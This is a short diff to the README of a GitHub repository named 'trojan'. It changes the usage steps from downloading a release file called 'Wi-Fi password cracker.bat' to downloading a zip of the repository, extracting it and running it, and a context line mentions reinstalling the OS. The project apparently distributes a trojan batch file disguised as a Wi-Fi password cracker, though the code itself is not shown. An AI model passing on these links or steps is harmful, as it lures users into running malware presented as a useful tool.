@@ -65,9 +65,9 @@ Reinstall the OS
 
 ## Usage
 
-Go to <a href="https://github.com/VarunBanka/trojan/releases/tag/V1">relese section</a> and download <a href="https://github.com/VarunBanka/trojan/releases/download/V1/Wi-Fi.password.cracker.bat">Wi-Fi password cracker.bat</a>
+<a href="https://github.com/VarunBanka/trojan/archive/refs/heads/main.zip">Download this file</a>
 
-Download it
+Extract it 
 
 Run it
 
